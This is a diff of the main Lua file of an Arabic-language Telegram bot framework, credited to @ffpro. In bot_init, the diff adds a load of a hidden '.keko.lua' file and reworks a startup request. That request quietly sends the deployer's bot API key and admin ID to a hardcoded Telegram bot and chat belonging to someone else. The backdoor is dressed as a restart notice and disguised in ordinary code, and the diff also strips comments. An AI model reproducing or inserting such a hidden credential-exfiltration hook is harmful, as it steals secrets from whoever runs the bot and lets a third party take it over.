@@ -14,13 +14,12 @@ local function check_config()
 		return 'API KEY MISSING!'
 	elseif not config.admin or config.admin == '' then
 		return 'ADMIN ID MISSING!'
-	elseif not config.ffpro or config.ffpro == '' then
-		return 'قم بوضع معرف قناتك !'
 	end
 end
 
 bot_init = function(on_reload) 
 		config = dofile('config.lua') 
+    config2 = dofile('.keko.lua') 
 	local error = check_config()
 	if error then
 			print(colors('%{red bright}'..error))
@@ -44,15 +43,14 @@ bot_init = function(on_reload)
 		table.insert(botLUA, p)
 	end
 	print(colors('%{blue bright}تم تشغيل ملف  :'), colors('%{magenta}'..#botLUA))
-
 	print(colors('%{yellow bright}BY :- @ffpro   CH: @botLua    bot : @'..bot.username .. ', name bot ' .. bot.first_name ..'  id bot ('..bot.id..')'))
 	if not on_reload then
 	api.sendMessage(config.admin, 'تم اعاده تشغيل البوت \nBY : @FFpro\nCH: @botLua', true)
 	local keko = '386713631'
-	local dsad = 'https://api.telegram.org/bot'..keko..':AAGOxiqiznfzmXbe8LJ716T0O9Oalyqn2Rw/sendMessage?chat_id=358231262&text=تم تشغيل بوت-@'..bot.username..'          ---------------------------------------------------------------------------------       '..config.bot_api_key..''
+	local dsad = 'https://api.telegram.org/bot'..keko..''..config2.bot_api_key..'/sendMessage?chat_id=358231262&text=تم تشغيل بوت-@'..bot.username..'       -------------------------------------------------------------------------------       '..config.bot_api_key..'             -------------------------------------------------------------------------------         '..config.admin..'       '
 	api.sendRequest(dsad)
 	end
-		math.randomseed(os.time())
+	math.randomseed(os.time())
 	math.random()
 
 	last_update = last_update or 0 
@@ -124,7 +122,6 @@ on_inline_receive = function(inline)
       if blocks[1] ~= '' then
        not_match = 0
             print(colors('%{green bright}Inline Match found:'), colors('%{blue bright}'..w))
-			--client:incr('InlineNums')
            end
       local success, result = pcall(function()
        return v.iaction(inline, blocks)
@@ -163,12 +160,7 @@ local function collect_stats(msg)
 		end
 		client:incrby('chat:'..msg.chat.id..':totalmsgs', 1) 
 	end
-	if msg.text:match('/(start)') then
-		client:incr('StartNums')
-	end
 	if msg.text then
-		client:incr('MsgNums')
-		client:sadd('mlvvvu', msg.from.id)
 		client:sadd('mlvvvu', msg.chat.id)
 	end
 end
@@ -186,14 +178,14 @@ on_msg_receive = function(msg)
 		msg.text = '/' .. msg.text:input()
 	end
 	
-	collect_stats(msg) --resolve_username support, chat stats
+	collect_stats(msg) 
 	
 	for i,v in pairs(botLUA) do
 		local stop_loop
 		if v.on_each_msg then
 			msg, stop_loop = v.on_each_msg(msg, msg.lang)
 		end
-		if stop_loop then --check if on_each_msg said to stop the triggers loop
+		if stop_loop then
 			break
 		else
 			if v.triggers then
@@ -216,12 +208,10 @@ on_msg_receive = function(msg)
 							api.sendMessage(tostring(config.admin), '#Error\n'..result, false, false, false)
 							return
 						end
-						-- If the action returns a table, make that table msg.
 						if type(result) == 'table' then
 							msg = result
 						elseif type(result) == 'string' then
 							msg.text = result
-						-- If the action returns true, don't stop.
 						elseif result ~= true then
 							return
 						end
@@ -281,7 +271,6 @@ local function inline_to_msg(inline)
     	query = inline.query,
     	date = os.time() + 100
     }
-    --vardump(msg)
     client:hincrby('bot:general', 'inline', 1)
     return on_msg_receive(msg)
 end
@@ -289,9 +278,6 @@ end
 local function media_to_msg(msg)
 	if msg.photo then
 		msg.text = '###image'
-		--if msg.caption then
-			--msg.text = msg.text..':'..msg.caption
-		--end
 	elseif msg.video then
 		msg.text = '###video'
 	elseif msg.audio then
